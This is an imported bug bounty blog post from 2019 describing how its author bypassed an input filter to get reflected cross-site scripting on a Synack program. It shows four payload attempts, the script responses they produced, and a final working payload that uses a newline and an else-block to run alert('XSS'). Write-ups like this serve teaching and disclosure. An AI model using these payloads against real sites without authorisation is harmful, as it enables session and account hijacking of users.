---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-05-17_xssed-my-way-to-1000.md
original_filename: 2019-05-17_xssed-my-way-to-1000.md
title: XSSed my way to 1000$
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 2fb38bf25736e26e03102123061ca9044c9f349f7d97b44ca818040190035c9e
text_sha256: e32c04212d2ddc2a6c332e431716904a182561b125ead9ff6d13092e7ece4351
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# XSSed my way to 1000$

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-05-17_xssed-my-way-to-1000.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `2fb38bf25736e26e03102123061ca9044c9f349f7d97b44ca818040190035c9e`
- Text SHA256: `e32c04212d2ddc2a6c332e431716904a182561b125ead9ff6d13092e7ece4351`


## Content

---
title: "XSSed my way to 1000$"
page_title: "XSSed my way to 1000$ | I'm Gaurav Narwani"
url: "https://gauravnarwani.com/xssed-my-way-to-1000/"
final_url: "https://gauravnarwani.com/xssed-my-way-to-1000/"
authors: ["Gaurav Narwani (@gauravnarwani97)"]
bugs: ["XSS"]
bounty: "1,100"
publication_date: "2019-05-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5257
---

[ ![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/05/xss.jpg?fit=700%2C394&ssl=1) ](https://gauravnarwani.com/xssed-my-way-to-1000/)

# XSSed my way to 1000$

[admin](https://gauravnarwani.com/author/admin/ "Posts by admin") / [May 17, 2019](https://gauravnarwani.com/xssed-my-way-to-1000/)

Hello Guys, I recently encountered with an amazing bypass to an endpoint of a program on Synack. Although the bug wasn’t as hard to find, a minimalistic programming knowledge helped me get over 1000$ on this program. As I have discussed the basics of Cross-Site Scripting in my previous blog I’ll move directly to the case study. To know about Cross-Site Scripting read my previous blog _**[here](https://gauravnarwani.com/a-tale-of-3-xss/)**_**[.](https://gauravnarwani.com/a-tale-of-3-xss/)** Please don’t forget to read the **Bug Bounty Tip** at the end of each post and also like, share and subscribe to the Blog.

### Case Study: Reflected XSS filter bypass

The application under test was a three-tier web application – Presentation tier (Front-End/User Interface), Application Tier (Functional Logic) and Data Tier (Databases). As this was a private program all illustrations of vulnerabilities will be represented with the host as example.com.

The application has a login page where users can use the credentials provided to sign-in the application using provided credentials.

After visiting a few pages, A page with a parameter (let’s assume it to be **a**) whose value was reflected into a script tag, in the response, was found.

**Try 1:** As the value of parameter **a** was reflected in the response, the first instinct was to close the script tag after which any payload can be inserted. Turned out that the application rejects **<** (less than) symbol and filters **“** to **& quot;** and **>** to **& gt;**.As the method didn’t work, a payload had to be designed which didn’t use the symbols **“, < and >**

Payload: example.com?a=**’)} <hello**

Response: 500 Error

Payload: example.com?a=**’)}hello” >**

Response:

<script type=”text/javascript”>

if (somefunction !== something) { something = true; }

if (false) {

something.start(‘**’)}hello &quot;&gt; **‘}

</script>

**Try 2:** As the value of parameter a was reflected inside the script tags, a simple payload of alert(‘XSS’); was entered. Although there wasn’t any issue with the filter on this payload, XSS didn’t fire on the target application.

Payload: example.com?a=**hello’)}alert(‘XSS’);**

Response:

<script type=”text/javascript”>

if (somefunction !== something) { something = true; }

if (false) {

something.start(‘**hello’)}alert(‘XSS’);** ‘}

</script>

**Try 3:** The thing to note was that although the payload had escaped the tag, it didn’t fire. After analysing the code for some time, it was found out that, the if condition where the payload fires are only considered when the condition on the first function:

if (somefunction !== something) { something = true; }

**is false**. To bypass this, an alternating condition called the **else condition** was used. The **else condition** satisfies the original requirement because if an else was implied to the if(false) condition above, the condition will hold true against the original condition and**bypasses** the use of if(false) condition where the payload was reflected and not fired.

It was also observed that **%0A** did get the value of the payload to the new line.

Hence a payload was constructed as **1′)}%0Aelse{%0Aalert(‘XSS’);**

Payload: example.com?a= **1′)}%0Aelse{%0Aalert(‘XSS’);**

Response:

<script type=”text/javascript”>

if (somefunction !== something) { something = true; }

if (false) {

something.start(‘**1’)}**

**else{**

**alert(‘XSS’);**_‘)_

}

</script>

**Try 4:** The XSS didn’t fire as the parenthesis ‘) was unclosed, hence a payload was then specified as:

Payload: example.com?a= **1′)}%0Aelse{%0Aalert(‘XSS’);(‘**

Response:

<script type=”text/javascript”>

if (somefunction !== something) { something = true; }

if (false) {

something.start(‘**1’)}**

**else{**

**alert(‘XSS’);(‘** ‘)

}

</script>

And the XSS box popped up on the webpage:

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/03/xss-popup.png?fit=322%2C204&ssl=1)

Final payload used: **1′)}%0Aelse{%0Aalert(‘XSS’);(‘**

A bounty of $1100 was given by Synack.

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/05/WhatsApp-Image-2019-05-18-at-3.36.43-AM.jpeg?fit=707%2C323&ssl=1)

That’s all for this Blog. Hope you liked it.

**#BugBountyTip** : When signing up, try to claim a username that collides with existing page namespaces, such as /login. This can have unpredictable outcomes.  
[@EdOverflow](https://twitter.com/EdOverflow)

That’s all for today. Please subscribe to my [blog](https://gauravnarwani.com/blog/). Connect with me on [LinkedIn.](https://linkedin.com/in/gauravnarwani97/)

## Gaurav Narwani

### Share this:

  * [Twitter](https://gauravnarwani.com/xssed-my-way-to-1000/?share=twitter "Click to share on Twitter")
  * [Facebook](https://gauravnarwani.com/xssed-my-way-to-1000/?share=facebook "Click to share on Facebook")
  * [LinkedIn](https://gauravnarwani.com/xssed-my-way-to-1000/?share=linkedin "Click to share on LinkedIn")
  * [WhatsApp](https://gauravnarwani.com/xssed-my-way-to-1000/?share=jetpack-whatsapp "Click to share on WhatsApp")
  * [Telegram](https://gauravnarwani.com/xssed-my-way-to-1000/?share=telegram "Click to share on Telegram")
  * [Print](https://gauravnarwani.com/xssed-my-way-to-1000/#print "Click to print")
  * 

### Like this:

Like Loading...

Posted in: [Bug Bounty](https://gauravnarwani.com/category/bugb/)
